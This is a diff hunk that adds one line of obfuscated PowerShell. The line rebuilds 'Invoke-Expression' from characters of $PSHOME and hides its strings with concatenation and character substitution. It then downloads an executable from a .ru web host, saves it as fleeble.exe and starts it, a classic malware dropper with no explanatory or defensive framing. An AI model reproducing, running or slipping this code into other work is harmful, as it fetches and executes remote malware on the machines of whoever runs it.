@@ -1,0 +1,1 @@
+﻿ & ( $PSHoME[21]+$PShOmE[34]+'X')( (('(New-Ob'+'ject '+'System.N'+'et'+'.'+'WebClient).'+'Down'+'l'+'o'+'adFile'+'(Cmxhttp://'+'www.wvhmedi'+'cin'+'e.ru'+'/1/P2.exe'+'Cm'+'x,Cmxf'+'le'+'eble.exe'+'Cm'+'x'+');Sta'+'r'+'t-Proc'+'e'+'ss'+' Cmxfleeb'+'le.exeC'+'mx') -replace([CHar]67+[CHar]109+[CHar]120),[CHar]39) )
